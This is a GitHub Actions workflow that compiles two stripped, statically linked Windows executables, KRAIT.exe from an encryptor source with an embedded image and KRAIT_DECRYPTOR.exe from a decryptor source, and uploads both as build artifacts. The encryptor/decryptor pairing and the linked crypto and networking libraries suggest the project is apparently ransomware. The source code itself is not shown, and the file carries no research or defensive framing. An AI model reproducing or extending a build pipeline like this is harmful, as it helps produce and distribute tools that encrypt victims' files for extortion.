name: Build Krait

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Install mingw
      run: |
        choco install mingw -y
        echo "C:\mingw64\bin" >> $GITHUB_PATH
    
    - name: Build decryptor
      run: |
        g++ -O2 -s -static -std=c++17 decryptor.cpp -o KRAIT_DECRYPTOR.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -lcrypt32 -lws2_32
    
    - name: Build encryptor with resources
      run: |
        windres -i krait.webp -o krait.res -O coff
        g++ -O2 -s -static -std=c++17 encryptor.cpp krait.res -o KRAIT.exe -ladvapi32 -luser32 -lgdi32 -lshell32 -lcrypt32 -lws2_32
    
    - name: Upload artifacts
      uses: actions/upload-artifact@v4
      with:
        name: Krait
        path: |
          KRAIT.exe
          KRAIT_DECRYPTOR.exe
